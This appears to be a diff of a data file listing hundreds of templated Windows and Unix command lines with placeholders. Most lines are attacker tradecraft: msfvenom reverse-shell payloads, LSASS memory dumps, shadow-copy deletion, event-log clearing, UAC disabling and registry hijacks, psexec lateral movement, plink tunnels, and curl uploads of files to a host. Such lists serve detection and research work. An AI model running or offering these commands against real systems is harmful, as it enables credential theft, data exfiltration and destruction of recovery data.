+cat email.txt | ssmtp ${username}@${domain} 2> error.log
+psexec \\${ip_address} -i -u ${username} -p ${password} -c ${command_to_execute} -d
+7z.exe a -slt -p${password} ${destination_file_path} ${source_file_path}
+mailx -s ${email_subject} ${username}@${domain} < mail.txt 2> /dev/null
+powershell -c "msfvenom -p windows/meterpreter/reverse_tcp_rc4_dns LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
+cat email.txt | mpack -s ${email_subject} ${username}@${domain} 2> error.log
+powershell -c "vssadmin Delete Shadows /All /quiet"
+powershell -c "psexec.exe \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute} -d"
+sdelete.exe -q ${local_file_path}
+powershell -c "choco install -y 7zip"
+cmd /c "vssadmin create shadow /for=C:"
+choco install -f Megasync
+cmd /c "plink.exe -ssh -l ${username} -N -R ${ip_address}:${remote_port}:127.0.0.1:${local_port}"
+cmd /c "sc stop ${service_name}"
+cmd /c "msfvenom -p windows/meterpreter/reverse_winhttps LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
+powershell -c "psexec \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -s"
+cmd /c "curl.exe -X POST -F file=@${source_file_path} http://${ip_address}:${port}/upload"
+cmd /c "mstsc /v:${ip_address} /f"
+cmd /c "msfvenom -p windows/x64/meterpreter/reverse_winhttps LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
+powershell -c "psexec \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute}"
+psexec.exe \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute}
+vssadmin.exe Delete Shadows /all
+7z a -slp -p${password} ${destination_file_path} ${source_file_path}
+powershell -c "7z.exe a -slp -p${password} ${destination_file_path} ${source_file_path}"
+plink -ssh -l ${username} -N -R ${ip_address}:${remote_port}:127.0.0.1:${local_port} ${ip_address}
+powershell -c "7z a -p ${destination_file_path} ${source_file_path}"
+powershell -c "procdump -mm lsass lsassdump.dmp"
+cmd /c "7z.exe a ${destination_file_path} ${source_file_path} -p"
+sdelete.exe -f ${local_file_path}
+powershell -c "wevtutil.exe cl application"
+choco install -y rclone
+cmd /c "vssadmin.exe Delete Shadows /All"
+echo ${email_content} | mpack -s ${email_subject} ${username}@${domain} 2> error.log
+cmd /c "reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /f"
+plink -ssh -P ${remote_port} -l ${username} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N
+powershell -c "curl -X POST -F file=@${source_file_path} http://${ip_address}:${port}/upload"
+powershell -c "psexec \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute} -d"
+sdelete.exe -s ${local_file_path}
+cat email.txt | mpack -s ${email_subject} ${username}@${domain}
+cmd /c "certutil -encode -Unicode error.txt encode.txt"
+cmd /c "wevtutil.exe cl security"
+plink -ssh ${username}@${ip_address} -P ${remote_port} -l ${username} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N
+nmap -T5 ${ip_address} 2> /dev/null
+powershell -c "wevtutil.exe cl security"
+powershell -c "msfvenom -p windows/meterpreter_reverse_https LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
+cmd /c "plink.exe -ssh -l ${username} -pw ${password} -N -R ${ip_address}:${remote_port}:127.0.0.1:${local_port}"
+powershell -c "del /f /q ${local_file_path}"
+sendmail ${username}@${domain} < mail.txt 2> &1
+cmd /c "curl.exe -X POST http://${ip_address}/upload -F 'files=@${source_file_path}'"
+cmd /c "curl -v -X POST -F file=@${source_file_path} http://${ip_address}:${port}/upload"
+ipconfig.exe /all
+powershell -c "Psexec64 \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -s"
 powershell -c "sdelete.exe -s ${local_file_path}"
-cmd /c "Psexec64.exe \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute}"
-vssadmin.exe delete shadows /All /quiet
-cmd /c "curl -X POST http://${ip_address}/upload -H -F 'files=@${source_file_path}'"
-arp.exe -a
-Psexec64 \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute}
+powershell -c "del /q ${local_file_path}"
+cmd /c "taskkill /F /im ${process_name} /T"
+nmap -p- -sC -sV ${ip_address} 2> error.log
+vssadmin.exe Delete Shadows /all /quiet
+rm -fr ${local_file_path}
+powershell -c "vssadmin.exe delete shadows /all /Quiet"
+nmap -A ${ip_address} 2> error.log
+curl -X POST -F file=@${source_file_path} http://${ip_address}:${port}/upload
+cmd /c "psexec \\${ip_address} -i -u ${username} -p ${password} -c ${command_to_execute} -d"
+cmd /c "psexec \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -s"
+7z a -slt -p ${destination_file_path} ${source_file_path}
+cmd /c "wevtutil cl application"
+powershell -c "plink.exe -ssh -l ${username} -N -R ${ip_address}:${remote_port}:127.0.0.1:${local_port} ${ip_address}"
+cmd /c "choco install -y 7zip"
+echo ${email_content} | mpack -s ${email_subject} ${username}@${domain} 2> &1
+powershell -c "mstsc /v:${ip_address} /f /public"
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
+nmap -p- -sC ${ip_address} 2> /dev/null
+powershell -c "sdelete.exe -f ${local_file_path}"
+sdelete -accepteula ${local_file_path}
+cmd /c "mstsc.exe /v:${ip_address} /public"
+powershell -c "wevtutil cl security"
+msfvenom -p windows/x64/meterpreter_reverse_http LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
+cmd /c "wmic shadowcopy call create Volume=C:"
+powershell -c "wmic.exe os get Caption,Version"
+cmd /c "Psexec64 \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -d"
+powershell -c "choco install psexec"
+wmic.exe os get TotalVirtualMemorySize
+cmd /c "sdelete -f ${local_file_path}"
+cmd /c "Psexec64 \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -s"
+msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
+cmd /c "msfvenom -p windows/x64/meterpreter/reverse_winhttp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
+powershell -c "plink.exe -ssh ${username}@${ip_address} -P ${remote_port} -l ${username} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N"
+powershell -c "reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /f"
+7z a -p ${destination_file_path} ${source_file_path}
+powershell -c "Psexec64.exe \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute}"
+cmd /c "7z.exe a -slt ${destination_file_path} ${source_file_path} -p"
+powershell -c "sdelete -f -q ${local_file_path}"
+certutil -encode -UnicodeText -gmt error.txt encode.txt
+cmd /c "procdump.exe -accepteula -mm lsass.exe lsassdump.dmp"
+certutil -encode ${source_file_path} ${destination_file_path}
+mail -s ${email_subject} ${username}@${domain} < mail.txt 2> &1
+cmd /c "vssadmin delete shadows /all /quiet"
+cmd /c "mstsc.exe /v:${ip_address} /f /admin"
+powershell -c "hostname"
+powershell -c "vssadmin Delete Shadows /all /Quiet"
+cmd /c "certutil -encode -UnicodeText -f error.txt encode.txt"
+cmd /c "plink.exe -ssh ${username}@${ip_address} -P ${remote_port} -l ${username} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N"
+powershell -c "netstat.exe"
+powershell -c "reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f"
+Psexec64.exe \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute}
+curl.exe -X POST -F file=@${source_file_path} http://${ip_address}:${port}/upload
+taskkill.exe /im ${process_name} /T
+powershell -c "7z.exe a -slp -p ${destination_file_path} ${source_file_path}"
+cmd /c "vssadmin.exe delete shadows /All"
+mstsc.exe /v:${ip_address} /admin
+cmd /c "7z.exe a -p ${destination_file_path} ${source_file_path}"
+cmd /c "7z a -slp ${destination_file_path} ${source_file_path} -p"
+powershell -c "curl -X POST -F 'file=@${source_file_path}' http://${ip_address}:${port}/upload"
+cmd /c "choco install -y psexec"
+rm -f ${local_file_path} 2> error.log
+msfvenom -p windows/x64/meterpreter_reverse_https LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
+del /q /f ${local_file_path}
+cmd /c "sdelete -accepteula ${local_file_path}"
+powershell -c "taskkill.exe /im ${process_name} /T"
+powershell -c "mstsc /v:${ip_address}"
+echo ${email_content} | mpack -s ${email_subject} ${username}@${domain} 2> /dev/null
+nmap -sP ${ip_address} 2> error.log
+cmd /c "mstsc.exe /v:${ip_address} /f /public"
+cmd /c "choco install -f Megasync"
+powershell -c "plink.exe -ssh -l ${username} -N -R ${ip_address}:${remote_port}:127.0.0.1:${local_port}"
+cmd /c "curl -v -X POST http://${ip_address}/upload -H -F files=@${source_file_path}"
+powershell -c "reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_EXPAND_SZ"
+cmd /c "7z.exe a -slp -p${password} ${destination_file_path} ${source_file_path}"
+powershell -c "plink.exe -ssh -l ${username} -pw ${password} -N -R ${ip_address}:${remote_port}:127.0.0.1:${local_port} ${ip_address}"
+nmap ${ip_address} 2> error.log
+7z a -p${password} ${destination_file_path} ${source_file_path}
+procdump -ma lsass lsassdump.dmp
+cmd /c "netstat"
+curl -X POST http://${ip_address}/upload -H -F 'files=@${source_file_path}'
+powershell -c "msfvenom -p windows/x64/meterpreter/reverse_winhttp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
+powershell -c "procdump -accepteula -ma lsass lsassdump.dmp"
+mailx -s ${email_subject} ${username}@${domain} < mail.txt
+plink.exe -ssh ${username}@${ip_address} -P ${remote_port} -l ${username} -pw ${password} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N
+Psexec64 \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -d
+plink.exe -ssh -l ${username} -N -R ${ip_address}:${remote_port}:127.0.0.1:${local_port}
+cmd /c "7z.exe a -p${password} ${destination_file_path} ${source_file_path}"
+cmd /c "ipconfig /renew"
+sdelete -q -accepteula ${local_file_path}
+msfvenom -p windows/x64/shell/reverse_tcp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
+powershell -c "reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /f"
+powershell -c "curl.exe -X POST -H -F 'file=@${source_file_path}' http://${ip_address}:${port}/upload"
+powershell -c "mstsc /v:${ip_address} /public"
+rm -rf ${local_file_path}
+cmd /c "vssadmin.exe delete shadows /all /Quiet"
+powershell -c "tasklist"
+Psexec64 \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -s
+powershell -c "msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
+7z.exe a -slp -p ${destination_file_path} ${source_file_path}
+cmd /c "wmic.exe os get FreePhysicalMemory"
+cat email.txt | mail -s ${email_subject} ${username}@${domain}
+mstsc /v:${ip_address} /restrictedAdmin
+certutil -encode -UnicodeText -f error.txt encode.txt
+sdelete -s ${local_file_path}
+powershell -c "msfvenom -p windows/meterpreter/reverse_winhttp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
+reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD_LITTLE_ENDIAN /d 0 /f
+cmd /c "psexec.exe \\${ip_address} -i -u ${username} -p ${password} -c ${command_to_execute} -d"
+powershell -c "procdump.exe -accepteula -mm lsass lsassdump.dmp"
+nmap -T5 ${ip_address}
+procdump -accepteula -ma lsass.exe lsassdump.dmp
+psexec.exe \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -s
+choco install putty
+curl -X POST -F "file=@${source_file_path}" http://${ip_address}:${port}/upload
+powershell -c "7z.exe a -slp ${destination_file_path} ${source_file_path} -p"
+ssmtp ${username}@${domain} < mail.txt 2> /dev/null
+mstsc /v:${ip_address} /f
+powershell -c "msfvenom -p windows/meterpreter/reverse_dns LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
+powershell -c "psexec.exe \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute}"
+powershell -c "Psexec64 \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute} -d"
+cmd /c "curl -X POST -F file=@${source_file_path} http://${ip_address}:${port}/upload"
+cmd /c "rmdir /q /s ${local_file_path}"
+powershell -c "psexec.exe \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -d"
+mstsc.exe /v:${ip_address} /multimon
+vssadmin.exe delete shadows /all /quiet
+reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_MULTI_SZ /f
+powershell -c "curl -v -X POST -F file=@${source_file_path} http://${ip_address}:${port}/upload"
+cmd /c "certutil -encode -Unicode -v -f error.txt encode.txt"
+cmd /c "choco install -y rclone"
+cmd /c "procdump.exe -accepteula -ma lsass lsassdump.dmp"
+wevtutil.exe cl system
+powershell -c "sdelete.exe -s -q -accepteula ${local_file_path}"
+taskkill /f /im ${process_name}
+vssadmin.exe Delete Shadows /All /quiet
+powershell -c "curl -X POST -F file=@${source_file_path} http://${ip_address}:${port}/upload"
+powershell -c "psexec.exe \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -d"
+cmd /c "tasklist"
+cmd /c "curl -X POST -F 'file=@${source_file_path}' http://${ip_address}:${port}/upload"
+cmd /c "plink -ssh -P ${remote_port} -l ${username} -pw ${password} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N"
+wmic shadowcopy call create Volume=C:
+powershell -c "ipconfig.exe /all"
+powershell -c "psexec.exe \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -s"
+cmd /c "msfvenom -p windows/meterpreter/reverse_tcp_rc4 LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
+cmd /c "mstsc /v:${ip_address} /multimon"
+Psexec64.exe \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -d
+cmd /c "psexec \\${ip_address} -i -u ${username} -p ${password} -c ${command_to_execute}"
